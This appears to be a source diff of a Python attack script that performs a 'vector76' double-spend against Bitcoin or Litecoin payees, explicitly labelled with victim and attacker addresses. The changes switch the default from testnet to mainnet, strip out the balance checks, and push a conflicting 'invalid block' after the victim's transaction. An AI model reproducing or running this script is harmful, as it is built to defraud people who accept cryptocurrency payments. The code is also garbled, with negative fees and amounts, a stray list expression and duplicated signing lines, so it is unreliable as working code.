@@ -30,9 +30,8 @@ parser.add_argument("--symbol",
                     help="coin symbol btc or ltc (Default = btc)",
                     type=str)
 parser.add_argument("--is_testnet",
-                    "-test",
-                    help="Testnet flag (Default=True)",
-                    default=True,
+                    help="Testnet flag (Default=False)",
+                    default=False,
                     type=bool)
 
 def to_satoshi(btc_amount):
@@ -113,7 +112,8 @@ if "ltc" == coin_symbol:
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 if coin_symbol == "ltc":
     transaction_util = cryptos.Litecoin(testnet=testnet)
-    print(fake_send_from)
+    #node = litecoin.rpc.Proxy(f"http://fallacy.fiatfaucet.com:{port}", service_port=port)
+    #print(node.getinfo())
     sender  = transaction_util.privtopub(fake_send_from)
     address = transaction_util.pubtoaddr(sender)
     balance = transaction_util.get_balance(address)
@@ -124,42 +124,34 @@ else:
 
 print("OK")
 print(balance)
-if balance["confirmed"] <= 0:
-    balance = balance["unconfirmed"]
-else:
-    balance = balance["confirmed"]
+#if balance["confirmed"] <= 0:
+#    balance = balance["unconfirmed"]
+#else:
+#    balance = balance["confirmed"]
 
 
 send_amount = to_satoshi(amount_btc)
 
-if balance < send_amount:
-    print(f"[!] insufficient funds. ")
-    exit()
+#if balance < send_amount:
+#    print(f"[!] insufficient funds. ")
+#    exit()
+#
+fee = -10000
 
-fee = 10000
-
-tx_victim   = [{"address": victim_address, "value": send_amount}]
+tx_victim   = [{"address": victim_address, "value": -send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
-tx_victim   = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_victim, fee=fee), fake_send_from)
-tx_attacker = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee), fake_send_from)
+tx_victim   = transaction_util.signall(transaction_util.mktx(inputs, tx_victim), fake_send_from)
+tx_attacker = transaction_util.signall(transaction_util.mktx(inputs, tx_attacker), fake_send_from)
 
 tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
 
 vector76    = f"{tx_victim}{tx_attacker}"
-#[tx_victim, tx_attacker]
-#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
-#vector76 = transaction_util.mktx_with_change(inputs, cryptos.deserialize(vector76), fee=fee)
-#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
+[tx_victim, tx_attacker]
+vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
+vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
-#print("Generating vector76 Block...")
-#payload = [attacker_address, vector76]
-#payload = json.dumps(payload)
-#print(payload)
-#exit()
-#data = node.call("generateblock", payload)
-#print(data)
 print()
 print("[+] READY...")
 print()
@@ -179,9 +171,10 @@ print()
 print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print("Sending V1 Transaction ...")
-transaction_util.pushtx(tx_victim)
-#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount)
-print()
+
+#transaction_util.pushtx(tx_victim)
+txid = transaction_util.send(fake_send_from, address, victim_address, -send_amount)
+print(txid)
 input("--- Send the vector76 lock after pressing the enter key. --- ")
 print()
 print()
@@ -192,7 +185,7 @@ print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送
 #print()
 #node.call("submitblock", data)
 #time.sleep(0.7)
-transaction_util.pushtx(vector76)
+transaction_util.pushtx(vector76_block)
 #print("Submit Block ...")
 #submit_block(data)
 print()
